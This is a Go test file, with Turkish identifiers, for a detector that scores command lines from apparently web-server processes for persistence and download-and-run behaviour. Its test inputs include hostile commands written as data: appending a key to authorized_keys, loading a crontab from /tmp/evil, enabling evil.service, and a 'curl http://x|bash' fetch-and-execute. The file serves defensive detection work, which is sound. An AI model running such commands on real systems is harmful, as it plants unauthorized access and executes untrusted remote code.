package main

import "testing"

func TestPersistenceYazma(t *testing.T) {
	// Yazma (>> authorized_keys) → persistence_yazma.
	if p, kod, _ := surecPuanla(true, "/bin/sh", "sh -c echo key >> /home/c/.ssh/authorized_keys", 1000); p != 35 || kod != "persistence_yazma" {
		t.Fatalf("authorized_keys yazma: p=%d kod=%s", p, kod)
	}
	// crontab yaz (liste degil) → persistence_yazma.
	if p, kod, _ := surecPuanla(true, "/usr/bin/crontab", "crontab /tmp/evil", 1000); p != 35 || kod != "persistence_yazma" {
		t.Fatalf("crontab yaz: p=%d kod=%s", p, kod)
	}
	// systemctl enable → persistence_yazma.
	if p, _, _ := surecPuanla(true, "/bin/sh", "sh -c systemctl enable evil.service", 1000); p != 35 {
		t.Fatalf("systemctl enable: p=%d", p)
	}
}

func TestPersistenceOkumaFP(t *testing.T) {
	// Salt okuma → 0 (FP olmamali).
	reads := []string{
		"sh -c crontab -l",
		"sh -c cat /home/c/.bashrc",
		"sh -c grep -r x /etc/cron.d",
		"sh -c tar -czf b.tgz /var/spool/cron",
		"sh -c crontab -l >/dev/null 2>&1",
		"sh -c cat /home/c/.bashrc >/dev/null",
	}
	for _, cl := range reads {
		if p, _, _ := surecPuanla(true, "/bin/sh", cl, 1000); p != 0 {
			t.Fatalf("salt-okuma FP: %q → %d", cl, p)
		}
	}
}

func TestPersistenceWebDegil(t *testing.T) {
	if p, _, _ := surecPuanla(false, "/bin/sh", "sh -c echo x >> /etc/cron.d/y", 0); p != 0 {
		t.Fatalf("web-olmayan persistence: %d", p)
	}
}

func TestR2R4Sira(t *testing.T) {
	// Hem indir-calistir hem persistence → R2 (calistirma) kazanir.
	if p, kod, _ := surecPuanla(true, "/bin/bash", "bash -c curl http://x|bash; echo y >> ~/.bashrc", 1000); p != 40 || kod != "sanal_kabuk_cmd" {
		t.Fatalf("R2 oncelik: p=%d kod=%s", p, kod)
	}
}
